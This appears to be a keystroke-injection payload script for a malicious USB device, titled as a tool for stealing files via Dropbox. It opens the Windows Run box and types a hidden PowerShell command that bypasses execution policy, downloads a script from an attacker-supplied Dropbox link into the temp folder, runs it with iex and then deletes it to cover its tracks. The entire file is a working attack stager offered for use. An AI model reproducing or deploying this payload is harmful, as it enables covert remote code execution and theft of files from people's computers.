
//Dropbox Exfiltration - Stealing files with Staged Powershell Payloads
layout('us');
typingSpeed(10,10)
press("GUI r");
delay(500);
type("powershell -w h -NoP -NonI -Exec Bypass \"$e=\\\"$env:TMP/e.ps1\\\";iwr (https://PASTE YOUR Dropbox link) -O $e;iex $e;rm $e\"\n")
delay(1000);
